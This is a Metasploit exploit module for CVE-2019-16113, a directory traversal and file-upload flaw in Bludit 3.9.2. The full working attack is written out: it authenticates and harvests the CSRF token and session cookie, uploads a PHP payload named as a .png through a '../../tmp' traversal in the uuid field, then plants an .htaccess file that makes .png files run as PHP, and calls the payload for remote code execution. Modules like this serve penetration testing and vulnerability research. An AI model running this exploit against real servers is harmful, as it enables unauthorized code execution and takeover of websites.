# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::PhpEXE
  include Msf::Exploit::FileDropper
  include Msf::Auxiliary::Report

  def initialize(info={})
    super(update_info(info,
      &#039;Name&#039;           => "Bludit Directory Traversal Image File Upload Vulnerability",
      &#039;Description&#039;    => %q{
        This module exploits a vulnerability in Bludit. A remote user could abuse the uuid
        parameter in the image upload feature in order to save a malicious payload anywhere
        onto the server, and then use a custom .htaccess file to bypass the file extension
        check to finally get remote code execution.
      },
      &#039;License&#039;        => MSF_LICENSE,
      &#039;Author&#039;         =>
        [
          &#039;christasa&#039;, # Original discovery
          &#039;sinn3r&#039;     # Metasploit module
        ],
      &#039;References&#039;     =>
        [
          [&#039;CVE&#039;, &#039;2019-16113&#039;],
          [&#039;URL&#039;, &#039;https://github.com/bludit/bludit/issues/1081&#039;],
          [&#039;URL&#039;, &#039;https://github.com/bludit/bludit/commit/a9640ff6b5f2c0fa770ad7758daf24fec6fbf3f5#diff-6f5ea518e6fc98fb4c16830bbf9f5dac&#039; ]
        ],
      &#039;Platform&#039;       => &#039;php&#039;,
      &#039;Arch&#039;           => ARCH_PHP,
      &#039;Notes&#039;          =>
        {
          &#039;SideEffects&#039; => [ IOC_IN_LOGS ],
          &#039;Reliability&#039; => [ REPEATABLE_SESSION ],
          &#039;Stability&#039;   => [ CRASH_SAFE ]
        },
      &#039;Targets&#039;        =>
        [
          [ &#039;Bludit v3.9.2&#039;, {} ]
        ],
      &#039;Privileged&#039;     => false,
      &#039;DisclosureDate&#039; => "2019-09-07",
      &#039;DefaultTarget&#039;  => 0))

    register_options(
      [
        OptString.new(&#039;TARGETURI&#039;, [true, &#039;The base path for Bludit&#039;, &#039;/&#039;]),
        OptString.new(&#039;BLUDITUSER&#039;, [true, &#039;The username for Bludit&#039;]),
        OptString.new(&#039;BLUDITPASS&#039;, [true, &#039;The password for Bludit&#039;])
      ])
  end

  class PhpPayload
    attr_reader :payload
    attr_reader :name

    def initialize(p)
      @payload = p
      @name = "#{Rex::Text.rand_text_alpha(10)}.png"
    end
  end

  class LoginBadge
    attr_reader   :username
    attr_reader   :password
    attr_accessor :csrf_token
    attr_accessor :bludit_key

    def initialize(user, pass, token, key)
      @username = user
      @password = pass
      @csrf_token = token
      @bludit_key = key
    end
  end

  def check
    res = send_request_cgi({
      &#039;method&#039; => &#039;GET&#039;,
      &#039;uri&#039;    => normalize_uri(target_uri.path, &#039;index.php&#039;)
    })

    unless res
      vprint_error(&#039;Connection timed out&#039;)
      return CheckCode::Unknown
    end

    html = res.get_html_document
    generator_tag = html.at(&#039;meta[@name="generator"]&#039;)
    unless generator_tag
      vprint_error(&#039;No generator metadata tag found in HTML&#039;)
      return CheckCode::Safe
    end

    content_attr = generator_tag.attributes[&#039;content&#039;]
    unless content_attr
      vprint_error("No content attribute found in metadata tag")
      return CheckCode::Safe
    end

    if content_attr.value == &#039;Bludit&#039;
      return CheckCode::Detected
    end

    CheckCode::Safe
  end

  def get_uuid(login_badge)
    print_status(&#039;Retrieving UUID...&#039;)
    res = send_request_cgi({
      &#039;method&#039; => &#039;GET&#039;,
      &#039;uri&#039;    => normalize_uri(target_uri.path, &#039;admin&#039;, &#039;new-content&#039;, &#039;index.php&#039;),
      &#039;cookie&#039; => "BLUDIT-KEY=#{login_badge.bludit_key};"
    })

    unless res
      fail_with(Failure::Unknown, &#039;Connection timed out&#039;)
    end

    html = res.get_html_document
    uuid_element = html.at(&#039;input[@name="uuid"]&#039;)
    unless uuid_element
      fail_with(Failure::Unknown, &#039;No UUID found in admin/new-content/&#039;)
    end

    uuid_val = uuid_element.attributes[&#039;value&#039;]
    unless uuid_val && uuid_val.respond_to?(:value)
      fail_with(Failure::Unknown, &#039;No UUID value&#039;)
    end

    uuid_val.value
  end

  def upload_file(login_badge, uuid, content, fname)
    print_status("Uploading #{fname}...")

    data = Rex::MIME::Message.new
    data.add_part(content, &#039;image/png&#039;, nil, "form-data; name=\"images[]\"; filename=\"#{fname}\"")
    data.add_part(uuid, nil, nil, &#039;form-data; name="uuid"&#039;)
    data.add_part(login_badge.csrf_token, nil, nil, &#039;form-data; name="tokenCSRF"&#039;)

    res = send_request_cgi({
      &#039;method&#039;  => &#039;POST&#039;,
      &#039;uri&#039;     => normalize_uri(target_uri.path, &#039;admin&#039;, &#039;ajax&#039;, &#039;upload-images&#039;),
      &#039;ctype&#039;   => "multipart/form-data; boundary=#{data.bound}",
      &#039;cookie&#039;  => "BLUDIT-KEY=#{login_badge.bludit_key};",
      &#039;headers&#039; => {&#039;X-Requested-With&#039; => &#039;XMLHttpRequest&#039;},
      &#039;data&#039;    => data.to_s
    })

    unless res
      fail_with(Failure::Unknown, &#039;Connection timed out&#039;)
    end
  end

  def upload_php_payload_and_exec(login_badge)
    # From: /var/www/html/bludit/bl-content/uploads/pages/5821e70ef1a8309cb835ccc9cec0fb35/
    # To: /var/www/html/bludit/bl-content/tmp
    uuid = get_uuid(login_badge)
    php_payload = get_php_payload
    upload_file(login_badge, &#039;../../tmp&#039;, php_payload.payload, php_payload.name)

    # On the vuln app, this line occurs first:
    # Filesystem::mv($_FILES[&#039;images&#039;][&#039;tmp_name&#039;][$uuid], PATH_TMP.$filename);
    # Even though there is a file extension check, it won&#039;t really stop us
    # from uploading the .htaccess file.
    htaccess = <<~HTA
    RewriteEngine off
    AddType application/x-httpd-php .png
    HTA
    upload_file(login_badge, uuid, htaccess, ".htaccess")
    register_file_for_cleanup(&#039;.htaccess&#039;)

    print_status("Executing #{php_payload.name}...")
    send_request_cgi({
      &#039;method&#039; => &#039;GET&#039;,
      &#039;uri&#039;    => normalize_uri(target_uri.path, &#039;bl-content&#039;, &#039;tmp&#039;, php_payload.name)
    })
  end

  def get_php_payload
    @php_payload ||= PhpPayload.new(get_write_exec_payload(unlink_self: true))
  end

  def get_login_badge(res)
    cookies = res.get_cookies
    bludit_key = cookies.scan(/BLUDIT\-KEY=(.+);/i).flatten.first || &#039;&#039;

    html = res.get_html_document
    csrf_element = html.at(&#039;input[@name="tokenCSRF"]&#039;)
    unless csrf_element
      fail_with(Failure::Unknown, &#039;No tokenCSRF found&#039;)
    end

    csrf_val = csrf_element.attributes[&#039;value&#039;]
    unless csrf_val && csrf_val.respond_to?(:value)
      fail_with(Failure::Unknown, &#039;No tokenCSRF value&#039;)
    end

    LoginBadge.new(datastore[&#039;BLUDITUSER&#039;], datastore[&#039;BLUDITPASS&#039;], csrf_val.value, bludit_key)
  end

  def do_login
    res = send_request_cgi({
      &#039;method&#039; => &#039;GET&#039;,
      &#039;uri&#039;    => normalize_uri(target_uri.path, &#039;admin&#039;, &#039;index.php&#039;)
    })

    unless res
      fail_with(Failure::Unknown, &#039;Connection timed out&#039;)
    end

    login_badge = get_login_badge(res)
    res = send_request_cgi({
      &#039;method&#039;    => &#039;POST&#039;,
      &#039;uri&#039;       => normalize_uri(target_uri.path, &#039;admin&#039;, &#039;index.php&#039;),
      &#039;cookie&#039;    => "BLUDIT-KEY=#{login_badge.bludit_key};",
      &#039;vars_post&#039; =>
        {
          &#039;tokenCSRF&#039; => login_badge.csrf_token,
          &#039;username&#039;  => login_badge.username,
          &#039;password&#039;  => login_badge.password
        }
    })

    unless res
      fail_with(Failure::Unknown, &#039;Connection timed out&#039;)
    end

    # A new csrf value is generated, need to update this for the upload
    if res.headers[&#039;Location&#039;].to_s.include?(&#039;/admin/dashboard&#039;)
      store_valid_credential(user: login_badge.username, private: login_badge.password)
      res = send_request_cgi({
        &#039;method&#039; => &#039;GET&#039;,
        &#039;uri&#039;    => normalize_uri(target_uri.path, &#039;admin&#039;, &#039;dashboard&#039;, &#039;index.php&#039;),
        &#039;cookie&#039; => "BLUDIT-KEY=#{login_badge.bludit_key};",
      })

      unless res
        fail_with(Failure::Unknown, &#039;Connection timed out&#039;)
      end

      new_csrf = res.body.scan(/var tokenCSRF = "(.+)";/).flatten.first
      login_badge.csrf_token = new_csrf if new_csrf
      return login_badge
    end

    fail_with(Failure::NoAccess, &#039;Authentication failed&#039;)
  end

  def exploit
    login_badge = do_login
    print_good("Logged in as: #{login_badge.username}")
    upload_php_payload_and_exec(login_badge)
  end
end

